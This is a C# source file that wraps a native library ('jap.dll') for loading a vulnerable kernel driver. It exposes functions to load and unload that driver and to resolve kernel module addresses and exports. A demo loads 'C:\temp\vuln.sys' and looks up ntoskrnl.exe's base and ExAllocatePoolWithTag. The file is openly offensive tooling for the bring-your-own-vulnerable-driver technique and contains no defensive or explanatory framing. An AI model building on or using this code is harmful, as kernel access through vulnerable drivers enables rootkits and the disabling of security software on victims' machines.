using System;
using System.Runtime.InteropServices;

internal static class NativeMethods
{
    private const string DllName = "jap.dll";

    [DllImport(DllName, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.I1)]
    internal static extern bool eTryLoadVuln(string vuln_driver_path, string vuln_driver_name, out IntPtr pDriverState);

    [DllImport(DllName, CallingConvention = CallingConvention.Cdecl)]
    [return: MarshalAs(UnmanagedType.I1)]
    internal static extern bool eUnloadVuln(IntPtr driverState);

    [DllImport(DllName, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
    internal static extern UIntPtr eGetKernelModuleAddress(string module_name);

    [DllImport(DllName, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
    internal static extern UIntPtr eGetKernelModuleExport(IntPtr driverState, ulong kernel_module_base, string function_name);
}

public sealed class DriverState : IDisposable
{
    private IntPtr _nativePtr;
    private bool _disposed;
    private readonly object _lock = new object();

    private DriverState(IntPtr nativePtr)
    {
        _nativePtr = nativePtr;
    }

    public static DriverState Create(string driverPath, string driverName)
    {
        if (string.IsNullOrEmpty(driverPath)) throw new ArgumentNullException(nameof(driverPath));
        if (string.IsNullOrEmpty(driverName)) throw new ArgumentNullException(nameof(driverName));

        if (NativeMethods.eTryLoadVuln(driverPath, driverName, out IntPtr ptr) && ptr != IntPtr.Zero)
        {
            return new DriverState(ptr);
        }

        return null;
    }

    public IntPtr NativePointer
    {
        get
        {
            ThrowIfDisposed();
            return _nativePtr;
        }
    }

    public static UIntPtr GetKernelModuleAddress(string moduleName)
    {
        if (string.IsNullOrEmpty(moduleName)) throw new ArgumentNullException(nameof(moduleName));
        return NativeMethods.eGetKernelModuleAddress(moduleName);
    }


    public UIntPtr GetKernelModuleExport(UIntPtr kernelModuleBase, string functionName)
    {
        ThrowIfDisposed();
        if (string.IsNullOrEmpty(functionName)) throw new ArgumentNullException(nameof(functionName));
        return NativeMethods.eGetKernelModuleExport(_nativePtr, kernelModuleBase.ToUInt64(), functionName);
    }

    public bool Unload()
    {
        lock (_lock)
        {
            if (_disposed) return false;

            if (_nativePtr == IntPtr.Zero)
            {
                _disposed = true;
                return false;
            }

            try
            {
                bool result = NativeMethods.eUnloadVuln(_nativePtr);
                _nativePtr = IntPtr.Zero;
                _disposed = true;
                return result;
            }
            catch
            {
                _nativePtr = IntPtr.Zero;
                _disposed = true;
                return false;
            }
        }
    }

    private void ThrowIfDisposed()
    {
        if (_disposed) throw new ObjectDisposedException(nameof(DriverState));
    }

    public void Dispose()
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    private void Dispose(bool disposing)
    {
        lock (_lock)
        {
            if (_disposed) return;

            if (_nativePtr != IntPtr.Zero)
            {
                try
                {
                    NativeMethods.eUnloadVuln(_nativePtr);
                }
                catch
                {
                }
                finally
                {
                    _nativePtr = IntPtr.Zero;
                }
            }

            _disposed = true;
        }
    }
    ~DriverState()
    {
        Dispose(false);
    }
}

class Program
{

    static void Main(string[] args)
    {
        using (var driver = DriverState.Create(@"C:\temp\vuln.sys", "vuln"))
        {
            if (driver == null)
            {
                Console.WriteLine("Failed to load driver");
                return;
            }

            var baseAddr = DriverState.GetKernelModuleAddress("ntoskrnl.exe");
            Console.WriteLine("base: 0x" + baseAddr.ToUInt64().ToString("X"));

            var exportAddr = driver.GetKernelModuleExport(baseAddr, "ExAllocatePoolWithTag");
            Console.WriteLine("export: 0x" + exportAddr.ToUInt64().ToString("X"));
        } 
    }
}
